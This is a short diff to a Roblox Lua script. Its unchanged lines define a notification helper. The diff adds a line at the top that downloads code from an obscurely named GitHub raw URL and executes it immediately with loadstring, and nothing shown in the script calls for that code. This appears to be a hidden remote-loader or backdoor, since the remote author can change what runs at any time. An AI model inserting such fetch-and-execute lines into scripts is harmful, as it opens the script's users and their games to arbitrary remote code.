@@ -1,3 +1,5 @@
+wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jj123llol/asdasdasdasd/main/lglglglglgl",true))()
 local StarterGui = game:GetService("StarterGui")
 local Notify = function(_Title, _Text , Time)
     StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
